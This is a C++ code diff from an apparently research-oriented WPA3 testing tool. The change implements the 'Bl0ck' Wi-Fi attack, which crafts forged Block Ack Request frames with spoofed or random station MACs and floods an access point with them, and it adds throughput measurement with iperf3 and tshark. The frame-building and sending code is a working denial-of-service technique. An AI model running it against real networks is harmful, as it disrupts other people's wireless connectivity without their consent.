@@ -20,26 +20,25 @@ namespace wpa3_tester::bl0ck_attack{
     using namespace Tins;
     using namespace chrono;
 
-    RadioTap get_bl0ck_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const int subtype) {
-        Dot11 frame;
-        frame.type(Dot11::CONTROL);
-        frame.subtype(subtype);
-        frame.addr1(ap_hw); // Receiver Address (RA)
-
-        const vector addr2_bytes(sta_hw.begin(), sta_hw.end());
-
+    RadioTap get_BAR_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw) {
+        Dot11BlockAckRequest bar(sta_hw, ap_hw); //for some reason is dst first
+        bar.fragment_number(4);
+        bar.start_sequence(1175);
         const vector<uint8_t> payload_data = {
-            0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
         };
-        // TODO v python script je prázdná hlavička, je nutné ji mít prázdnou
-        // RadioTap() <- dá tam něco defaultně
-        const RadioTap rt{};
-        return  rt / frame / RawPDU(addr2_bytes) / RawPDU(payload_data);
+        const RadioTap rt{}; // fill with driver?
+        return rt / bar / RawPDU(payload_data);
     }
 
+
+    RadioTap && get_BA_frame(HWAddress<6> hw_address, HWAddress<6> sta_hw){
+        //TODO
+        throw not_implemented_error("BA not implemented");
+    };
 
     void block(const string& STA_mac,
                const string& AP_mac,
@@ -48,19 +47,9 @@ namespace wpa3_tester::bl0ck_attack{
                const string& attack_type,
                const int duration_sec,
                const bool is_random) {
+        assert(attack_type == "BAR" || attack_type == "BAR");     //TODO add BARS
 
-        // Determine subtype: BAR=8, BA=9
-        int subtype;
-        if (attack_type == "BAR") {
-            subtype = 8;
-        } else if (attack_type == "BA") {
-            subtype = 9;
-        } else {
-            log(LogLevel::ERROR, "Invalid attack type: %s (expected BAR or BA)", attack_type.c_str());
-            throw runtime_error("Invalid attack type");
-        }
-
-        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s, Subtype: %d", attack_type.c_str(), subtype);
+        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s", attack_type.c_str());
 
         const NetworkInterface iface_obj(iface);
         const HWAddress<6> ap_hw(AP_mac);
@@ -76,12 +65,17 @@ namespace wpa3_tester::bl0ck_attack{
             try {
                 const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);
 
-                /*RadioTap block_frame = get_bl0ck_frame(ap_hw, sta_hw, subtype);
+                // Determine subtype: BAR=8, BA=9
+                RadioTap block_frame;
+                if (attack_type == "BAR") {
+                    block_frame = get_BAR_frame(ap_hw, sta_hw);
+                } else if (attack_type == "BA") {
+                    block_frame = get_BA_frame(ap_hw, sta_hw);
+                }
                 log(LogLevel::DEBUG, "Sending batch %d", iteration);
                 for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
-                this_thread::sleep_for(100ms);*/
+                this_thread::sleep_for(100ms);
                 iteration++;
-
             } catch (const exception& e) {
                 log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
                 throw;
@@ -92,9 +86,6 @@ namespace wpa3_tester::bl0ck_attack{
 
     void speed_observation_start(RunStatus &rs){
         //observer::start_musezahn(rs, "mz_gen", "client", "access_point");
-        observer::start_iperf3_server(rs,"iperf_server", "access_point");
-        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
-        observer::start_iperf3(rs,"iperf_client", "client", "access_point");
 
         const string c_mac = rs.get_actor("client")["mac"];
         const string a_mac = rs.get_actor("attacker")["mac"];
@@ -102,14 +93,18 @@ namespace wpa3_tester::bl0ck_attack{
 
         const string mac_filter =
     "(wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
-        " or (wlan[0] & 0xfc == 0x84 or wlan[0] & 0xfc == 0x94)";
+    " or ((wlan[0] & 0xfc) == 0x84 or (wlan[0] & 0xfc) == 0x94)";
 
-        const string full_filter = mac_filter; // + "  (link[0] == 0x88 or link[0] == 0x84)";
+        const string full_filter = mac_filter;
         observer::start_tshark(rs, "attacker", mac_filter); //FIXME
 
         //FIXME vypadá to, že
         observer::start_tshark(rs, "client", mac_filter); //FIXME
         //observer::start_thark(rs, "access_point", "udp port 5201");
+        this_thread::sleep_for(seconds(10));//FIXME wait for tshark
+        observer::start_iperf3_server(rs,"iperf_server", "access_point");
+        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
+        observer::start_iperf3(rs,"iperf_client", "client",  "access_point");
     }
 
     void setup_attack(RunStatus& rs){
@@ -154,25 +149,7 @@ namespace wpa3_tester::bl0ck_attack{
         log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
         this_thread::sleep_for(seconds(10));
         if(bl0ck_att_type == "BAR" || bl0ck_att_type == "BA"){
-           //FIXME block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
-            const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
-            const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
-
-            const vector<string> command = {
-                "sudo",
-                "python3",
-                "/home/kali/PycharmProjects/Bl0ck/Bl0ck.py",
-                "--sta", sta_mac.to_string(),
-                "--ap", ap_mac.to_string(),
-                "--wnic", rs.get_actor("attacker")["iface"],
-                "--attack","BAR",
-                "--verbose", "1",
-                "--num", "100",
-                "--frames","0",
-                "--rand", "1"
-            };
-            rs.process_manager.run("attacker", command);
-            this_thread::sleep_for(seconds(30));
+           block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
         } else {
             log(LogLevel::ERROR, "Unsupported attack type: %s", bl0ck_att_type.c_str());
             /*if (bl0ck_att_type == "BARS":
